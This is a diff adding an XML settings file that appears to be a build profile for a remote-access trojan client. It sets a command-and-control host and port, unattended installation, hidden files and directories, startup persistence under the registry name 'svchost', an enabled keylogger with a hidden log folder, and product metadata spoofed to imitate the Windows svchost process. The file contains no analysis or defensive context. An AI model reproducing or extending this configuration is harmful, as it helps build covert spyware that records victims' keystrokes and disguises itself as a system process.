@@ -1,0 +1,33 @@
+<settings>
+  <Tag>Office04</Tag>
+  <Hosts>192.168.0.114:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>6d046589-ba5c-4db4-bd50-8f0c6b4551a0</Mutex>
+  <UnattendedMode>True</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>Client</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>SubDir</InstallSub>
+  <HideFile>True</HideFile>
+  <HideSubDirectory>True</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>svchost</RegistryName>
+  <ChangeIcon>False</ChangeIcon>
+  <IconPath>
+  </IconPath>
+  <ChangeAsmInfo>True</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>True</HideLogDirectory>
+  <ProductName>svchost</ProductName>
+  <Description>
+  </Description>
+  <CompanyName>svchost</CompanyName>
+  <Copyright>
+  </Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>svchost</OriginalFilename>
+  <ProductVersion>2.8.3.7</ProductVersion>
+  <FileVersion>3.4.1.1</FileVersion>
+</settings>
